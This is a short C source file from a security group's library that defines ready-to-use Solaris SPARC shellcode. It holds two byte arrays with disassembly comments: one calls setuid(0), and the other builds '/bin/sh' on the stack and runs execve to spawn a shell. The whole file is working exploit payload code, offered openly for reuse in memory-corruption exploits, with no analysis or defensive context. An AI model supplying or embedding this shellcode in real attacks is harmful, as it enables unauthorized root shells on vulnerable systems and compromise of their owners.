/*
 *  sol-sparc-shellcode.c
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

char setuidcode[]=          /*  12 bytes                          */
    "\x90\x1a\x40\x09"      /*  xor     %o1,%o1,%o0               */
    "\x82\x10\x20\x17"      /*  mov     0x17,%g1                  */
    "\x91\xd0\x20\x08"      /*  ta      0x08                      */
;

char shellcode[]=           /*  48 bytes                          */
    "\x21\x0b\xd8\x9a"      /*  sethi   %hi(0x2f62696e),%l0       */
    "\xa0\x14\x29\x6e"      /*  or      %l0,0x96e,%l0             */
    "\x23\x0b\xdc\xda"      /*  sethi   %hi(0x2f736800),%l1       */
    "\x90\x23\xa0\x08"      /*  sub     %sp,0x08,%o0              */
    "\x92\x23\xa0\x10"      /*  sub     %sp,0x10,%o1              */
    "\x94\x1a\x80\x0a"      /*  xor     %o2,%o2,%o2               */
    "\xe0\x23\xbf\xf8"      /*  st      %l0,[%sp-0x08]            */
    "\xe2\x23\xbf\xfc"      /*  st      %l1,[%sp-0x04]            */
    "\xd0\x23\xbf\xf0"      /*  st      %o0,[%sp-0x10]            */
    "\xc0\x23\xbf\xf4"      /*  st      %g0,[%sp-0x0c]            */
    "\x82\x10\x20\x3b"      /*  mov     0x3b,%g1                  */
    "\x91\xd0\x20\x08"      /*  ta      0x08                      */
;

